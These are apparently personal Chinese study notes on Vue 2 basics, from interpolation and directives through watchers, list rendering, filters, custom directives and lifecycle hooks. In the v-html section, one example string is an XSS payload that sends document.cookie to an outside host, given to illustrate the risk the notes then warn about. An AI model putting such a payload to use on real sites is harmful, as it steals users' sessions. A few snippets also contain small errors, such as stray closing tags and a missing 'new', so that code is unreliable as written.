---

---



# Vue学习



> 写Vue首先注意

```html
 <script src="./VuePack/vue.js"></script>
```

## 1.Vue两大语法

```html
<div id="app">
        <h1>插值语法</h1>
       <h2> hello,{{name}},{{English}}</h2>
       <hr>
       <h1>指令语法</h1>
       <a v-bind:href="url.toUpperCase()" v-bind:x="hello">bilibili</a>
       <!-- v-bind可以直接简写为： -->
       <a :href="url" :x="hello">bilibili</a>

    </div>

    <script text="text/javascript">
        const x = new Vue({
            el:'#app',
            data:{
                name:'向晚1',
                English:'XiangWan',
                url:'https://www.bilibili.com/',
                hello:'你好'
            }
        })
    </script>
```

> 插值语法

功能:用于解析标签体内容。

写法:{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。

> 指令语法

功能:用于解析标签（包括:标签属性、标签体内容、绑定事件.....)。

举例:v-bind:href="xxx”或简写为:href="xxx" , xxx同样要写js表达式,且可以直接读取到data中的所有属性。

备注: Vue中有很多的指令，且形式都是: v-????，此处我们只是拿v-bind举个例子。



## 2.数据绑定

```html
<div id="num">
        数据单项绑定：<input type="text" name="num1" class="num" v-bind:value="number">
        数据双向绑定: <input type="text" name="num2" class="num" v-model:value="number">    
    </div>
    <script>
        new Vue({
            el:'#num',
            data:{
                number:'嘉然'
            }
        })
    </script>

```

Vue中有2种数据绑定的方式:
1.单向绑定(v-bind):数据只能从data流向页面。
2.双向绑定(v-model):数据不仅能从data流向页面，还可以从页面流向data。

备注:

1.双向绑定一般都应用在表单类元素上（如: input、select等)
2.v-model:value 可以简写为v-model，因为v-model默认收集的就是value值.



## 3.el和data不同写法

```html
<div id="app">
        {{name}}
    </div>
    <script>
        const v = new Vue({
            //el:'#app',
            // data:{
            //     name:'嘉然'
            // }
            //data的第二种写法
            data:function(){
                console.log('123',this)
                return{
                    name:'嘉然'
                }
            }
        })
        //el的第二种写法
        console.log(v)
        v.$mount('#app')
    </script>
```

>  el

1. new Vue时配置el属性

2. 先创建Vue实例，通过vm.$mount('#app')指定

> data

1. 对象式

2. 函数式 

学习到组件data必须用函数式

> Vue管理的函数，不能写箭头函数，一旦写箭头函数，this就不再是Vue实例了



## 4.MVVM模型

M：模型：对应data中数据==>plain javascript objects

V：试图：模板==>DOM

VM:视图模型：Vue实例对象 ==>Vue



## 5.Object.defineProperty方法

```html
<script>
        let number = '18';
        let person={
            name:'张三',
            sex:'男',
            // age:18
        }
        Object.defineProperty(person,'age',{
            get(){
                console.log('有人读取age属性')
                return number
            },
            set(value){
                console.log('有人修改age属性,值为',value)
                number=value
            }

            // value:18,
            // enumerable:true,//控制属性是否可以枚举,默认值是false
            // writable:true,//控制属性是否可以被修改
            // configurable:true//控制属性是否可以被删除
        })
        // console.log(Object.keys(person))
        console.log(person)
        // for(let key in person){
        //     console.log('@',person[key])
        // }
//如果设置的属性在Object.defineProperty,那么这个属性是不能被枚举遍历到的

    </script>
```



## 6.数据代理

通过一个对象代理对另一个对象中属性的操作：读/写

```html
<script>
        let obj ={x:100}
        let obj2 = { y:90}

        Object.defineProperty(obj2,'x',{
            get(){
                return obj.x
            },
            set(value){
                obj.x = value
            }
        })
    </script>
```



要获得data里的值，vm._data._



## 7.事件处理

```html
<body>
    <div id="root">{{name}}
        <button v-on:click="showinfo1">点我提示信息1传参</button>
        <button v-on:click="showinfo2($event,66)">点我提示信息2不传参</button>
    </div>

    <script>

        new Vue({
            el:'#root',
            data:{
                name :'嘉然'
            },
            methods:{
                showinfo1(event){
            //     alert('同学你好')
                    console.log(event.target.innerText)
                },
                showinfo2(event,number){
                    console.log(event,number)
                    alert('同学你好！')
                }

            }

        })
    </script>
</body>
```

事件基本使用：

1. 使用v-on:xxx或@xxx绑定事件，xxx是事件名

2. 事件的回调需要配置在methods对象中，vm上

3. methods中配置的函数，不用箭头函数，否则this不是vm

4. methods中配置的函数，都是被Vue管理的函数，this指向vm或组件实例对象

5. @click=”demo“和@click="demo($event)"效果一致。后者可传参
   
   

## 8.数据修饰符

Vue中事件修饰符

修饰符可以连续写

1. prevent：阻止默认事件（常用）

2. stop：阻止事件冒泡（常用）

3. once：事件只触发一次（常用）

4. capture：使用事件的捕获模式；

5. self：只有event.target是当前操作的元素才触发事件

6. passive：事件默认行为立即执行，无须等待事件回调执行完毕

```html
<style>
    /* 通配符，所有元素间20px */
    *{
        margin: 20px;
    }
    .demo1{
        height: 50px;
        background-color: blue;
    }
    .box1{
        padding: 5px;
        background-color: skyblue;
    }
    .box2{
        padding: 5px;
        background-color: pink;
    }
    .list{
        width: 200px;
        height: 200px;
        background-color: pink;
        /* 滚动条 */
        overflow: auto;
    }
    li{
        height: 100px;
    }

</style>
<body>
    <div id="root">
        <!-- 阻止默认事件 -->
        <a href="https://www.bilibili.com" @click="showinfo">{{name}}</a>
        <!-- 阻止事件冒泡（常用） 内层组件事件触发外层组件事件
        可以用Vue语法在内层函数加-->
        <div class="demo1" @click="showinfo">
            <button @click.stop="showinfo">点我提示信息</button>
        </div>
        <!-- 事件只触发一次 -->
        <button @click.once="showinfo">点我提示信息</button>
        <!-- 使用事件的捕获模式 捕获阶段由外向内-->
        <div class="box1" @click.capture="showMsg(1)">
            div1
            <div class="box2" @click="showMsg(2)">
                div2
            </div>
        </div>

        <!-- 只有event.target是当前操作的元素才触发事件 -->
        <div class="demo1" @click.self="showinfo">
            <button @click="showinfo">点我提示信息</button>
        </div>

        <!-- passive：事件默认行为立即执行，无须等待事件回调执行完毕 -->
        <div>
            <!-- scroll是滚动条发生移动 
                wheel是鼠标滚动，检测鼠标-->
                <!-- 此处就是不加passive先执行console。log
                加了passive就是先滚动，一边执行 -->
            <ul @wheel.passive="demo" class="list">
                <li>1</li>
                <li>2</li>
                <li>3</li>
                <li>4</li>
                <li>5</li>
            </ul>
        </div>



    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                name:'b站'
            },
            methods:{
                showinfo(e){
                    // e.preventDefault()
                    // e.stopPropagation()
                    alert('同学你好')
                    // console.log(e.target)
                },
                showMsg(msg){
                    console.log(msg)
                },
                demo(){
                    // console.log('@')
                for(let i=0;i<100000;i++){
                    console.log('#')
                }
                console.log('结束')
                }
            }
        })
    </script>
</body>
```



## 9.键盘事件

1. Vue常用的按键别名
   回车=>enter
   删除=>delete(捕获删除和退格键)
   退出=>esc
   空格=>space
   换行=>tab(必须配合keydown使用)
   上=>up
   下=>down
   左=>left
   右=>right

2. Vue未提供别名的按键。可使用按键原始的key值绑定，注意转为kebab-case(短横线命名)
   当遇到驼峰命名的键，全部转为小写

3. 系统修饰键(用法特殊)：ctrl、alt、shift、meta
- 配合keyup使用：按下修饰键同时，按下其他键，随后释放其他键，事件被触发

- 搭配keydown使用，正常触发事件
  
  

  4.使用keyCode指定具体按键(不推荐)

  5.Vue.config.keyCodes.自定义键名=键码。定制按键

```html
<body>
    <div id="root">
        <h2>键盘事件</h2>
        <input type="text" placeholder="按下回车提示输入" @keyup.huiche="showInfo">
    </div>
    <script>
        Vue.config.keyCodes.huiche=13//定义一个按键
        new Vue({
            el:'#root',
            data:{
                name:'嘉然'
            },
            methods:{
                //event对象拿到
                showInfo(e){
                    //回车编码为13
                    // console.log(e.keyCode)
                    // if(e.keyCode==13){
                    //    
                    // }
                    // console.log(e.key)
                    console.log(e.target.value)

                }
            }
        })
    </script>
</body>
```



## 10.计算属性与监视

### 计算属性

```html
<body>
    <div id="root">
        <h1>姓名案例</h1>
        <input type="text" placeholder="姓氏" v-model:value="name1"><br>
        <input type="text" placeholder="名字" v-model:value="name2"><br>
        <span>{{fullName}}</span>


    </div>
    <script>
        const vm = new Vue({
            el:'#root',
            data:{
                name1:'嘉',
                name2:'然'
            },
            computed:{
                fullName:{
                    //有人读取full Name时，get会被调用，返回值作为fullName的值
                    //get什么时候调用 1.初次读取fullName时 2。所依赖的数据发生变化
                    get(){
                        console.log('get被调用')
                        return  this.name1+'-'+this.name2
                    },
                    set(value){
                        const arr = value.split('-')
                        this.name1=arr[0]
                        this.name2=arr[1]
                    }

                }

            }

        })
    </script>
</body>
```

computed就是计算属性

简写

```html
<body>
    <div id="root">
        <h1>姓名案例</h1>
        <input type="text" placeholder="姓氏" v-model:value="name1"><br>
        <input type="text" placeholder="名字" v-model:value="name2"><br>
        <span>{{fullName()}}</span>


    </div>
    <script>
        const vm = new Vue({
            el:'#root',
            data:{
                name1:'嘉',
                name2:'然'
            },
            computed:{
                fullName(){
                    return  this.name1+'-'+this.name2
                }
            }

        })
    </script>
</body>
        })
    </script>
</body>
```

### 监视

```html
<body>
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click="changeWeather">切换天气</button>
    </div>
    <script>
        const vm = Vue({
            el: '#root',
            data: {
                isHot: true
            },
            computed: {
                info() {
                    return this.isHot ? '炎热' : '凉爽'
                }
            },
            methods: {
                changeWeather() {
                    this.isHot = !this.isHot
                }
            },
            // watch: {
            //     isHot: {
            //         //初始化时让handeler调用一下
            //         immediate: true
            //         //handler什么时候调用，被修改时
            //         ,
            //         handler(newValue, oldValue) {
            //             console.log('isHot被修改了', newValue, oldValue);
            //         }
            //     }
            // }

        })
        vm.$watch('isHot', {
            immediate: true
            //handler什么时候调用，被修改时
            ,
            handler(newValue, oldValue) {
                console.log('isHot被修改了', newValue, oldValue);
            }
        })
    </script>

</body>
```

> 监视属性watch

1. 被监视的属性变化时，回调函数自动调用，进行相关操作

2. 监视的属性必须存在，才能进行监视

3. 监视有两种写法：
   1.new Vue时传入watch配置
   2.通过vm.$watch监视 

### 深度监视

1. Vue中watch默认不检测对象内部值的改变(一层)

2. 配置deep:true可能监测对象内部值改变(多层)
   
   

1. Vue自身可以检测对象内部值的改变，但Vue提供的watch默认不可以

2. 使用watch时根据数据的具体结构，决定是否采用深度检测

```html
<body>
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click="changeWeather">切换天气</button>
        <br>
        <span>{{numbers.a}}</span>
        <span>{{numbers.b}}</span>
        <br>
        <button @click="numbers.a++">点我让a++</button>
        <br>
        <button @click="numbers={a:66,b:88}">改变numbers</button>

    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
                numbers: {
                    a: 1,
                    b: 2
                }
            },
            computed: {
                info() {
                    return this.isHot ? '炎热' : '凉爽'
                }
            },
            methods: {
                changeWeather() {
                    this.isHot = !this.isHot
                }
            },
            watch: {
                isHot: {
                    //初始化时让handeler调用一下
                    immediate: true
                    //handler什么时候调用，被修改时
                    ,
                    handler(newValue, oldValue) {
                        console.log('isHot被修改了', newValue, oldValue);
                    }
                },
                // 监视多级结构
                'numbers.a':{
                    handler(newValue,oldValue){
                        console.log('现在的a:',newValue,'之前的a:',oldValue)
                    }
                },
                //监视多级结构改变
                numbers:{
                    deep:true,
                    handler(newValue,oldValue){
                        console.log(oldValue,newValue)
                    }
                }
            }

        })
        // vm.$watch('isHot', {
        //     immediate: true
        //     //handler什么时候调用，被修改时
        //     ,
        //     handler(newValue, oldValue) {
        //         console.log('isHot被修改了', newValue, oldValue);
        //     }
        // })
    </script>

</body>
```

简写

```html
isHot(newValue,oldValue){
                    console.log(newValue.oldValue)
},
vm.$watch('isHot',(newValue,oldValue)=>{
            console.log(newValue,oldValue)
        })
```

> computed与watch区别

computed返回靠返回值

watch靠自己写的代码修改

1. computed能完成的功能，watch都能完成

2. watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作

#### 小原则

1. 所被Vue管理的函数，最好写成普通函数，this指向是vm或组件实例对象

2. 所有不被Vue管理的函数(定时器的回调函数，ajax的回调函数)，最好写成箭头函数，this指向是vm或组件实例对象 
   
   

## 11.绑定样式

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../VuePack/vue.js"></script>
    <style>
        .basic {
            border: 1px solid red;

        }

        .happy {
            border: 1px solid yellow;
        }

        .sad {
            border: 1px solid skyblue;
        }

        .normal {
            border: 1px solid gray;
        }

        .atg1 {
            height: 100px;
            width: 100px;
        }

        .atg2 {
            background-color: aqua;
        }

        .atg3 {
            border: 1px solid orange;
        }
    </style>
</head>

<body>
    <div id="root">
        <!-- 变化的样式v-bind：class -->
        <!-- 类名不确定 -->
        <div class="basic" :class="a" @click="changeMood()">{{name}}</div><br><br>
        <!-- 样式不确定 -->
        <div class="basic" :class="classArr">{{name}}</div><br><br>
        <!-- 动态决定用不用 -->
        <div class="basic" :class="classObj">{{name}}</div><br><br>
        <div class="basic" :style="styleObj">{{name}}</div><br><br>
        <div class="basic" :style="styleArr">{{name}}</div>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: '郭绍',
                a: 'normmal',
                classArr: ['atg1', 'atg2', 'atg3'],
                classObj:{
                    atg1:true,
                    atg2:false
                },
                styleObj:{
                    fontSize:'40px',
                },
                styleArr:[
                    {
                        fontSize:'40px'
                    },
                    {
                        color:'red'
                    }

                ]


            },
            methods: {
                changeMood() {

                    const arr = ['happy', 'sad', 'normal'];
                    //shift函数就是pop函数
                    //floor向下取整，random生成0.xxx无限接近于1，即可获得0，1，2的值
                    this.a = arr[Math.floor(Math.random() * 3)];

                }
            }
        })
    </script>
</body>

</html>   }
        })
    </script>
</body>
```

> 1.class样式

1. 绑定class样式-字符串写法，适用于类名不确定，需要动态绑定

2. 绑定class样式-数组写法，适用于要绑定的样式个数不确定，名字也不确定

3. 绑定class样式-对象写法，适用于要绑定的样式个数确定，名字确定，动态决定用不用

> style样式

1.   :style="fonSize:xxx"xxx是动态值

2. :style="[a,b]",a、b是样式对象 

# 



## 12.条件渲染

1. v-if

        写法：

            1.v-if="表达式"

            2.v-else-if="表达式"

            3.v-else=”表达式”

        适用：切换频率较低的场景

        特点：DOM元素直接被移除

        注意：v-if可以和:v-else-if、v-else一起使用，结构不能被打断

2.v-show

        写法：v-show=“表达式”

        适用于：切换频率较高的场景

        特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

3.备注：v-if时，元素可能无法获取到，使用v-show一定可以获取到

    可以把div替换成template

```html
<body>
    <div id="root">
        <h2 v-show="false">nihao</h2>

        <h2 v-if="true">年号</h2>

        <template v-if="true">
            <div>你好</div>
        <div>不好</div>
        </template>

    </div>

    <script>
        new Vue({
            el:'#root',

        })
    </script>
</body>
```



## 13.列表渲染

```html
<body>
    <div id="root">
        <div>
            <h2>列表渲染</h2><br>
            <ul>
                <li v-for="p in persons" :key="p.id">
                    {{p.age}}--{{p.name}}
                </li>
            </ul>
            <h2>对象渲染</h2><br>
            <ul>
                <li v-for="(value,key) in car" :key="key">
                    {{key}}--{{value}}
                </li>
            </ul>
            <h2>字符串</h2><br>
            <ul>
                <li v-for="(value,index) in str" :key="index">
                    {{index}}--{{value}}
                </li>
            </ul>
        </div>
    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                persons:[
                    {id:'001',name:'嘉然',age:'18'}
                    ,
                    {id:'002',name:'向晚',age:'18'}
                    ,
                    {id:'003',name:'贝拉',age:'18'}
                    ,
                    {id:'004',name:'乃琳',age:'18'}
                ],
                car:{
                    name:'保时捷911',
                    color:'黑色',
                    pants:'蕾丝花边'
                },
                str:'hello'
            }
        })
    </script>
</body>
```

要写key，因为Vue不写key的话，循环时是以索引来进行渲染的

1. 虚拟DOM中key的作用
   key是虚拟DOM对象的标识，数据发生变化时，Vue根据新数据生成新的虚拟DOM，随后Vue进行新虚拟DOM和旧虚拟DOM差异比较

2. 对比原则
   (1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
   a.若虚拟DOM中内容没变，直接使用之前的真实DOM
   b.若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM
   (2).旧虚拟DOM未找到与新虚拟DOM相同的key
   创建新的真实DOM，随后渲染到页面
   
   

3. index作为key会引发的问题
   1.若对数据进行：逆序添加、逆序删除等破坏顺序操作：会产生没有必要的真实DOM更新==>界面效果没问题。效率低
   2.结构中包含输入类的DOM：产生错误DOM更新==>界面有问题

4. 开发中如何选择key

            1.每条数据唯一标识作为key，id、手机号、身份证号、学号

            2.不存在对数据的逆序添加、删除等破坏顺序操作，仅用于渲染列表用于表示，则index作为key没问题



### 列表过滤

```html
<body>
    <div id="root">
        <div>
            <h2>列表渲染</h2><br>
            <input type="text" placeholder="输入你要查询的名字" v-model:value="keyWords">
            <ul>
                <li v-for="p in filPerson" :key="p.id">
                    {{p.age}}--{{p.name}}
                </li>
            </ul>

        </div>
    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                keyWords:'',
                persons:[
                    {id:'001',name:'嘉然',age:'18'}
                    ,
                    {id:'002',name:'向晚',age:'18'}
                    ,
                    {id:'003',name:'贝拉',age:'18'}
                    ,
                    {id:'004',name:'乃琳',age:'18'}
                ],
                // filPersons:[]
            },
            // watch:{
            //     keyWords:{
            //         immediate:true,

            //         handler(val){
            //             this.filPersons=this.persons.filter((p)=>{
            //                 return p.name.indexOf(val) !== -1;
            //             })
            //         }
            //     }
            // },
            computed:{
                filPerson(){
                    return this.persons.filter((p)=>{
                            return p.name.indexOf(this.keyWords) !== -1;
                        })
                }
            }
        })
    </script>
</body>
```



### 列表排序

```html
<body>
    <div id="root">
        <div>
            <h2>列表渲染</h2><br>
            <input type="text" placeholder="输入你要查询的名字" v-model:value="keyWords">
            <button @click="sortType=2">年龄升序</button>
            <button @click="sortType=1">年龄降序</button>
            <button @click="sortType=0">正常顺序</button>
            <ul>
                <li v-for="p in filPerson" :key="p.id">
                    {{p.age}}--{{p.name}}
                </li>
            </ul>

        </div>
    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                sortType:0,//0原顺序，1降序，2升序
                keyWords:'',
                persons:[
                    {id:'001',name:'嘉然',age:'18'}
                    ,
                    {id:'002',name:'向晚',age:'19'}
                    ,
                    {id:'003',name:'贝拉',age:'17'}
                    ,
                    {id:'004',name:'乃琳',age:'20'}
                ],

            },

            computed:{
                filPerson(){
                    const arr = this.persons.filter((p)=>{
                        return p.name.indexOf(this.keyWords)!=-1;
                    })
                    if(this.sortType){
                        arr.sort((p1,p2)=>{
                            return this.sortType === 1 ? p2.age-p1.age:p1.age-p2.age;
                        })
                    }
                    return arr;
                }
            }
        })
    </script>
</body>
```

使用sort函数

```java
public class Main {
    public static void main(String[] args) {
        Integer []arr ={1,3,4,6,7,8,2,7};
        Comparator my = new myComparator();
        Arrays.sort(arr,my);
        for (int i = 0; i < arr.length; i++) {
            System.out.print(arr[i]+" ");
        }

    }
}
class myComparator implements Comparator<Integer>{

    @Override
    public int compare(Integer o1, Integer o2) {
        /*如果o1小于o2，返回正值，o1大于o2就返回负值，
        * 降序就是o2-o1*/
        System.out.println("o1:"+o1+"o2:"+o2);
        return o1-o2;
    }
}
```

理解：

1. o1是遍历无序序列得到的元素，o2是有序序列的元素

2. 负数，当前插入元素小，放在前面

3. 正数，当前插入元素大，放后面
   
   | o1（无序）             | o2（有序）           | 结果  | 生成有序列表    |
   | ------------------ | ---------------- | --- | --------- |
   | 3（1，3）             | 1（**1**）         | 2   | 13        |
   | 4（1，3，4）           | 3（1**3**）        | 1   | 134       |
   | 6（1，3，4，6）         | 4（13**4**）       | 2   | 1346      |
   | 7（1，3，4，6，7）       | 6（134**6**）      | 1   | 13467     |
   | 8（1，3，4，6，7，8）     | 7（1346**7**）     | 1   | 134678    |
   | 2（1，3，4，6，7，8，2）   | 8（13467**8**）    | -6  | 1346728   |
   | 2（1，3，4，6，7，8，2）   | 6（134**6**728）   | -4  | 1342678   |
   | 2（1，3，4，6，7，8，2）   | 3（1**3**42678）   | -1  | 1234678   |
   | 2（1，3，4，6，7，8，2）   | 1（**1**2345678）  | 1   | 12345678  |
   | 7（1，3，4，6，7，8，2，7） | 4（123**4**5678）  | 3   | 123475678 |
   | 7（1，3，4，6，7，8，2，7） | 7（1234756**7**8） | 0   | 123456778 |
   | 7（1，3，4，6，7，8，2，7） | 8（1234567**7**8） | -1  | 123456778 |

### Vue监视数据的原理

1. vue会监视data中所有层次的数据

2. 如何监视对象中的数据
   通过setter实现监视，且在new Vue时传入要监测的数据
   1.对象中后追加的属性，Vue默认不做响应式处理
   2.如需给后添加的属性做响应式
   
      Vue.set(target，propertyName/index,value)或vm.$set(target,propertyName/index,value)

3. 如何监测数组中的数据
   
   通过包裹数更新元素的方法实现，本质就是做了两件事
   
   1.调用原生对应的方法对数组进行更新
   
   2.重新解析模板，进而更新页面

4. 在Vue修改数组中的某个元素一定要用如下方法
   
   1.使用这些API：push()、pop()、shift()、unshift()、splice()、sort()、reverse()
   
   2.Vue.set()或vm.$set()

5. 注意：
   
   Vue.set()和vm.$set()不能给vm或vm的根数据对象添加属性





## 14.收集表单数据

若:K<input type="text >，则v-model收集的是value值，用户输入的就是value值。

若:<input type="radio" />，则v-model收集的是value值，且要给标签配置value值。

若:<input type="checkbox" />
1.没有配置input的value属性，那么收集的就是checked(勾选or未勾选，是布尔值)

2.配置input的value属性:
(1)v-model的初始值是非数组，那么收集的就是checked(勾选or未勾选，是布尔值)

(2)v-model的初始值是数组,那么收集的的就是value组成的数组

备注:v-model的三个修饰符:

1. lazy:失去焦点再收集数据
2. number:输入字符串转为有效的数字
3. trim:输入首尾空格过滤



```html
<body>
    <div id="root">
        <form @submit="demo">
            账号：<input type="text" v-model.trim="userInfo.account"><br><br>
            密码：<input type="password" v-model="userInfo.password"><br><br>
            性别：
            男<input type="radio" name="sex" value="male" v-model="userInfo.sex">
            女<input type="radio" name="sex" value="female" v-model="userInfo.sex"><br><br>
            爱好：
            学习<input type="checkbox" name="hobby" v-model="userInfo.hobby" value="study">
            打游戏学习<input type="checkbox" name="hobby" v-model="userInfo.hobby" value="game">
            吃饭学习<input type="checkbox" name="hobby" v-model="userInfo.hobby" value="eat"><br><br>
            所属校区<select v-model="userInfo.city">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
            </select>
            <br><br>
            其他信息：
            <textarea name="ps" v-model.lazy="userInfo.other"></textarea><br><br>
            <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.bilibili.com">协议</a>
            <button type="submit">提交</button>
        </form>
    </div>
    <script>
        new Vue({
            el: '#root',
            data: {
                userInfo: {
                    account: '',
                    password: '',
                    sex: 'male',
                    hobby: [],
                    city: '',
                    other: '',
                    agree: ''
                }

            },
            methods: {
                demo() {
                    console.log(JSON.stringify(this.userInfo))
                }
            },
        })
    </script>

</body>
```



## 15.过滤器

定义：对要显示的数据进行特定格式化后再显示(适用于一些简单逻辑的处理)

语法：

1. ​	注册过滤器：Vue.filter(name.callback)或new Vue(filter:{})
2. 使用过滤器{{xxx|过滤器名}}或v-bind：属性=“xxx|过滤器名”

备注：

1. ​	过滤器可接收额外参数、多个过滤器可串联

2. 并没有改变原本的数据，产生新的对应数据

   

   ```html
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Document</title>
       <script src="../VuePack/vue.js"></script>
       <script src="../VuePack/dayjs.min.js"></script>
   </head>
   <body>
       <div id="root">
           <h2>显示格式化的时间</h2>
           <h3>现在是：{{fmtTime}}</h3>
   
       <h3>现在是：{{getFmtTime()}}</h3>
   
       <h3>现在是：{{time|timeFormater}}</h3>
   
       <h3>现在是：{{time|timeFormater('YYYY_MM_DD')| mySlice}}</h3>
       </div>
       <script>
           new Vue({
               el:'#root',
               data:{
                   time:1621561377603
               },
               computed:{
                   fmtTime(){
                       return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
                   }
               },
               methods: {
                   getFmtTime(){
                       return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
                   }
               },
               filters:{
                   timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
                       return dayjs(value).format(str)
                   },
                   mySlice(value){
                       return value.slice(0,4)
                   }
   
               }
   
           })
       </script>
       
   </body>
   </html>
   ```






## 16.内置指令

| 指令    | 用处                             |
| ------- | -------------------------------- |
| v-bind  | 单向绑定解析表达式，简写为：xxx  |
| v-model | 双向数据绑定                     |
| v-for   | 遍历数组/对象/字符串             |
| v-on    | 绑定事件监听，简写为@            |
| v-if    | 条件渲染（动态控制节点是否存在） |
| v-else  | 条件渲染（动态控制节点是否存在） |
| v-show  | 条件渲染（动态控制节点是否展示） |



```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<script src="../VuePack/vue.js"></script>
<body>
    <div id="root">
        <div>你好{{name}}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
        
    </div>
</body>
<script>
    new Vue({
        el:'#root',
        data:{
            name:'嘉然',
            str:'<h1>你好<h2>',
            str2:'<a href=javascript:location.href="http://www.bilibili.com?"+document.cookie>点我</a>'
        }
    })
</script>
</html>
```



> v-html指令：

1. 作用：向指定节点渲染包含html结构的内容

2. 与插值语法区别

   1.v-html会替换掉节点中所有内容，{{xx}}不会

   2.v-html可识别html结构

3. v-html有安全性问题

   1.网站上动态渲染任意html非常容易导致xss攻击

   2.可信内容上使用v-html，不要用在用户提交的内容上

> v-text指令

1. 作用：向所在节点渲染文本内容
2. 与插值语法区别：v-text替换1节点的内容，{{xx}}不会

> v-cloak（没有值）

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性
2. 使用css配合v-cloak可解决网速慢时页面展示出{{xxx}}的问题

> v-once

1. v-once所在节点在初次动态渲染后，视为静态内容
2. 以后数据的改变不会引起v-once所在结构的更新，可用于优化性能

> v-pre

 Vue不解析带这个的语句

## 17.自定义指令

> 定义语法：

1.局部指令

new Vue({

directives:{指令名:配置对象}

})

new Vue({

directives(){}

})

2.全局指令

Vue.directives(指令名,配置对象)或Vue.directive(指令名，回调函数)

> 配置对象常用三个回调

1.bind：指令与元素成功绑定时回调

2.inserted：指令所在元素被插入页面时调用

3.update：指令所在模板结构被重新解析时调用

> 备注

1.指令定义时不加v-，使用时要加v-

2.指令名如果是多个单词，使用kebab-case命名方式，不要用camelCase命名

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../VuePack/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>当前的n值是：<span v-text="n"></span></h2>
        <h2>放大10倍后的n值为：<span v-big="n"></span></h2>
        <button @click="n++">点我n+1</button>
        <hr>
        <input type="text" v-fbind:value="n">

    </div>
    <script>
        Vue.directive('fbind',{
                    //指令与元素成功绑定时（一上来）
                    bind(element,binding){
                        element.value=binding.value;
                    },
                    //指令所在元素被插入页面时
                    inserted(element,binding){
                        element.focus();
                    },
                    //指令所在模板被重新解析时
                    update(element,binding){
                        element.value=binding.value;
                    }
        })
        new Vue({
            el:'#root',
            data:{
                n:1
            },
            directives:{
                //v-big=“n”对应binding，data中的n对应element
                big(element,binding){
                    //big函数何时会被调用
                    //1.指令与元素成功绑定时（一上来）
                    //2.指令所在模板被重新解析时
                   element.innerText=binding.value*10
                },
                // fbind:{
                //     //指令与元素成功绑定时（一上来）
                //     bind(element,binding){
                //         element.value=binding.value;
                //     },
                //     //指令所在元素被插入页面时
                //     inserted(element,binding){
                //         element.focus();
                //     },
                //     //指令所在模板被重新解析时
                //     update(element,binding){
                //         element.value=binding.value;
                //     }
                    
                // }
            }
        })
    </script>
</body>
</html>
```



## 18.生命周期

1. 又名：生命周期回调函数，生命周期函数，生命周期钩子
2. 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数
3. 生命周期函数的名字不可更改，函数具体内容是程序员根据需求编写的
4. 生命周期函数的this指向是vm或组件实例对象

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../VuePack/vue.js"></script>
</head>

<body>
    <div id="root">
        <h2 :style="{opacity}">你好</h2>
    </div>
    <script>
        new Vue({
            el: '#root',
            data: {
                opacity: 1
            }
            , mounted(){
                setInterval(()=>{
                    this.opacity-=0.01
                    if(this.opacity<=0) this.opacity=1
                },16)
            }
        })

    </script>
</body>

</html>
```

|
|
|
|
|
|
|
|
|
|

| 生命周期 | 调用函数              |
| -------- | --------------------- |
| 将要创建 | 调用beforeCreate      |
| 创建完毕 | 调用created函数       |
| 将要挂载 | 调用beforeMount函数   |
| 挂载完毕 | **调用mounted函数**   |
| 将要更新 | 调用beforeUpdate      |
| 更新完毕 | updated函数           |
| 将要销毁 | **beforeDestroy函数** |
| 销毁完毕 | 嗲用destroyed         |

常用生命周期钩子

1. mounted：发送ajax请求，启动定时器，绑定自定义事件，订阅消息等【初始化操作】
2. beforeDestroy：清除定时器，解绑自定义事件，取消订阅消息【收尾工作】



销毁Vue实例

1. 销毁后借助Vue开发者工具看不到任何信息
2. 销毁后自定义事件会失效，原生DOM事件依然有效
3. 一般不会在beforeDestroy操作数据，即便操作数据，不触发更新流程





# 组件化编程

## 1.基本使用

> Vue使用组件的三大步骤

1. 定义组件(创建组件)
2. 注册组件
3. 使用组件(写组件标签)

> 一、如何定义一个组件

使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，也有点区别：

1. el不要写，为什么？-最终所有组件都要经过一个vm的管理，vm中el决定服务哪个容器
2. data必须写成函数，为什么？--避免组件被复用时，数据存在引用关系

> 二、如何注册组件？

1. 局部注册：new Vue时传入components选项
2. 全局注册：Vue.component('组件名',组件)

> 三、编写组件标签

<school></school>

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
